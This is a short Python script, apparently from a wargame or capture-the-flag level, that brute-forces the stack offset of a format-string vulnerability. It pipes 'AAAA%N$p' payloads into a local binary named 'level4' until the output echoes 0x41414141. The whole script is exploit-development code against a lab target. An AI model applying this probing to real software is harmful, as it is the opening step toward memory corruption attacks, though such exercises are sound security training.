import subprocess
import os

found='0x41414141'
#found='f7ffd9a0'
i=1
while True:
	loop_arg=bytes('\x41\x41\x41\x41%'+str(i)+'$p','utf-8')
	result = subprocess.run(['../level4'], input=loop_arg, stdout=subprocess.PIPE)
	print(result.stdout.decode('utf-8'))
	if result.stdout.decode('utf-8').find(found) >= 0:
		print('FINISH, RESULT: [%' + str(i) + '$p]')
		os._exit(0)
	i+=1
